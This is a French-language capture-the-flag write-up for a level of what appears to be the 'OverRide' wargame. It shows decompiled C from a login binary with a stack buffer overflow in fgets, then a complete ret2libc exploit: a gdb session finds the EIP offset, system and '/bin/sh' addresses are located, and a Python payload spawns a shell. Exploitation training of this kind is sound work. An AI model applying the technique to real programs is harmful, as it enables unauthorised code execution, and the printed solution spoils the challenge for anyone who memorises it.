--------------------------------------------
Code Source :

int verify_user_pass(byte *param_1) {
  int iVar1;
  byte *pbVar2;
  undefined in_CF;
  undefined in_ZF;
  
  iVar1 = 5;
  pbVar2 = (byte *)"admin";
  do {
    if (iVar1 == 0) break;
    iVar1 = iVar1 + -1;
    in_CF = *param_1 < *pbVar2;
    in_ZF = *param_1 == *pbVar2;
    param_1 = param_1 + 1;
    pbVar2 = pbVar2 + 1;
  } while ((bool)in_ZF);
  return (int)(char)((!(bool)in_CF && !(bool)in_ZF) - in_CF);
}

int verify_user_name(void) {
  int iVar1;
  byte *pbVar2;
  byte *pbVar3;
  undefined uVar4;
  undefined uVar5;
  byte bVar6;
  
  bVar6 = 0;
  uVar4 = &stack0xfffffff4 < (undefined *)0x10;
  uVar5 = &stack0x00000000 == (undefined *)0x1c;
  puts("verifying username....\n");
  iVar1 = 7;
  pbVar2 = &a_user_name;
  pbVar3 = (byte *)"dat_wil";
  do {
    if (iVar1 == 0) break;
    iVar1 = iVar1 + -1;
    uVar4 = *pbVar2 < *pbVar3;
    uVar5 = *pbVar2 == *pbVar3;
    pbVar2 = pbVar2 + (uint)bVar6 * -2 + 1;
    pbVar3 = pbVar3 + (uint)bVar6 * -2 + 1;
  } while ((bool)uVar5);
  return (int)(char)((!(bool)uVar4 && !(bool)uVar5) - uVar4);
}


undefined4 main(void) {
  undefined4 uVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 local_54 [16];
  int local_14;
  
  puVar3 = local_54;
  for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  local_14 = 0;
  puts("********* ADMIN LOGIN PROMPT *********");
  printf("Enter Username: ");
  fgets(&a_user_name,0x100,stdin);
  local_14 = verify_user_name();
  if (local_14 == 0) {
    puts("Enter Password: ");
    fgets((char *)local_54,100,stdin);
    local_14 = verify_user_pass((byte *)local_54);
    if ((local_14 == 0) || (local_14 != 0)) {
      puts("nope, incorrect password...\n");
      uVar1 = 1;
    }
    else {
      uVar1 = 0;
    }
  }
  else {
    puts("nope, incorrect username...\n");
    uVar1 = 1;
  }
  return uVar1;
}

--------------------------------------------

Solution :

On va utiliser un exploit ret to libc voici comment.

D'abord on peu voir que fgets peut cree un debordement de tampon, 2 fgets sont utiliser donc le premier attend dat_wil le second admin sauf que cela ne fait rien 
a cause de la condition "if ((local_14 == 0) || (local_14 != 0))" qui est tout le temps true.
Apres plusieur test seul le 2eme fgets cree un debordement de tampon, voyon si cela ecrase eip et si oui a quelle endroit :

gdb ./level01
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) info registers 
eax            0x1	1
ecx            0xffffffff	-1
edx            0xf7fd08b8	-134412104
ebx            0x33634132	862142770
esp            0xffffd710	0xffffd710
ebp            0x63413563	0x63413563
esi            0x0	0
edi            0x41346341	1093952321
eip            0x37634136	0x37634136
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) 


Donc eip est ecrasÃ© a 0x37634136

0x37634136 -> to_ascii -> 7cA6 
6Ac7 = 80 dans notre padding

Maintenant recuperont l'adresse de system et de /bin/sh pour cree notre payload 

System:

(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>


/bin/sh:

(gdb) find &system,+9999999,"/bin/sh" 
0xf7f897ec

Payload :

level01@OverRide:~$ (python -c 'print("dat_wil\n" + "a" * 80 + "\xd0\xae\xe6\xf7" + "----" + "\xec\x97\xf8\xf7")') > /tmp/lvl1
level01@OverRide:~$ cat /tmp/lvl1 - | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...